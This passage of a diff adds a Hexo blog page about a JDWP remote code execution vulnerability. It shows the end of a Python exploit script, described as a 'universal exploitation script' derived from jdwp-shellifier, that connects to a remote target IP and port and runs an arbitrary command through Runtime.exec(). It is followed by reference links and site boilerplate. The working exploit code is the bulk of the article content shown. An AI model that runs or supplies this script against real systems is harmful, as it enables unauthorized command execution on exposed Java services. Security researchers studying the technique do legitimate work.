+        return False
+
+    retId = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
+    print (&quot;[+] Runtime.exec() successful, retId=%x&quot; % retId)
+
+    return True
+
+if __name__ == &quot;__main__&quot;:
+    parser = argparse.ArgumentParser(description=&quot;Universal exploitation script for JDWP by @Lz1y, base on @_hugsy_&quot;,
+                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter )
+
+    parser.add_argument(&quot;-t&quot;, &quot;--target&quot;, type=str, metavar=&quot;IP&quot;, help=&quot;Remote target IP&quot;, required=True)
+    parser.add_argument(&quot;-p&quot;, &quot;--port&quot;, type=int, metavar=&quot;PORT&quot;, default=8000, help=&quot;Remote target port&quot;)
+
+    parser.add_argument(&quot;-c&quot;, &quot;--cmd&quot;, dest=&quot;cmd&quot;, type=str, metavar=&quot;COMMAND&quot;,
+                        help=&quot;Specify command to execute remotely&quot;)
+
+    args = parser.parse_args()
+    
+    cli = JDWPClient(args.target, args.port)
+    try:
+        cli.start()
+    except:
+        print(&quot;Handshake failed!&quot;)
+
+    #print vm description
+    print &quot;[+] Dump vm description \n&quot;, cli.description, &quot;\n&quot;
+    runtime_exec(cli)
+    cli.leave()
+</code></pre>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sq-smile/protected/p/13172831.html">https://www.cnblogs.com/sq-smile/protected/p/13172831.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Lz1y/jdwp-shellifier">https://github.com/Lz1y/jdwp-shellifier</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/JDWP/JDWP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qrl1009py8v1h6tedyds" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/Jellyfin/Jellyfin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-21402/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/JD-FreeFuck/JD-FreeFuck%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
